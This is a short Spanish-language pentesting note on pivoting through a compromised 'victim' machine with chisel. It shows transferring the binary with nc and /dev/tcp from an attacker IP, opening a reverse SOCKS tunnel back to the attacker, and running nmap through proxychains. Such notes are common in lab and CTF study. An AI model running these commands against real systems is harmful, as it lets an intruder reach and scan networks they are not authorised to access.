
En este documento veremos como hacer una tunelizacion parcial (solo un puerto) o total (toda la conexión por TCP).

# Instalación

### En la maquina victima

Podemos encontrar un binario facilmente pasable [aquí](https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz) (Hay que descomprimirlo), y lo podemos pasar facilmente usando nc
#### Del lado del atacante:

```Shell
sudo nc -lvnp < chisel
```
####  Del lado de la victima:

```shell
cat < /dev/tcp/{IP_ATACANTE}/{PUERTO} > chisel
```

# Tunelización total

### Configuración proxychains4

Para esto vamos a usar una conexión socks5, tenemos que asegurarnos que tenemos proxychains, y ademas, agregar la siguiente linea al final del archivo /etc/proxychains4.conf:

```shell
socks5 127.0.0.1 1080
```

### Chisel Use

#### Victima

```ruby
./chisel client {IP_ATACANTE}:{PUERTO} R:socks
```
#### Atacante

```ruby
chisel server --reverse -p {PUERTO}
```

#### Uso de tunelización

Ahora podemos usar proxychains, para que todos los paquetes del comando que usemos se redirijan usando socks5 hacia el objetivo, importante, si se va a usar Nmap, usarlo junto las opciones `-Pn -sT`:

```ruby
proxychains nmap -sT -Pn --min-rate 5000 -p- {IP}
```

